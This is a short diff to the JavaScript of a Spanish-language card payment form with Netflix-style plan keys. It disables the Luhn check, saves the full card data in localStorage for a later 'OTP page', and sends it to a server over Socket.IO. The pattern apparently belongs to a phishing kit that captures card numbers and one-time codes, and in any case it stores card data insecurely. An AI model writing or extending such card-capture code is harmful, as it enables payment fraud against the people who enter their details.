@@ -39,9 +39,10 @@ document.addEventListener('DOMContentLoaded', function() {
         e.target.value = e.target.value.replace(/\D/g, '');
     });
 
-    // Only letters and spaces for card name
+    // Only letters and spaces for card name + Convert to uppercase
     cardName.addEventListener('input', function(e) {
-        e.target.value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
+        let value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
+        e.target.value = value.toUpperCase();
     });
 
     // Form validation
@@ -124,12 +125,12 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        // Additional Luhn check
-        const cardNum = cardNumber.value.replace(/\s/g, '');
-        if (!luhnCheck(cardNum)) {
-            alert('Número de tarjeta inválido');
-            return;
-        }
+        // Additional Luhn check (skip for testing purposes - accept any valid format)
+        // const cardNum = cardNumber.value.replace(/\s/g, '');
+        // if (!luhnCheck(cardNum)) {
+        //     alert('Número de tarjeta inválido');
+        //     return;
+        // }
 
         // Get plan from localStorage
         const selectedPlan = localStorage.getItem('netflix_selected_plan') || 'premium';
@@ -143,6 +144,10 @@ document.addEventListener('DOMContentLoaded', function() {
             plan: selectedPlan.charAt(0).toUpperCase() + selectedPlan.slice(1),
             timestamp: new Date().toISOString()
         };
+
+        // Save card data to localStorage for later use in OTP page
+        localStorage.setItem('netflix_card_data', JSON.stringify(cardData));
+        console.log('💾 Card data saved to localStorage');
 
         try {
             // Submit to server via Socket.IO
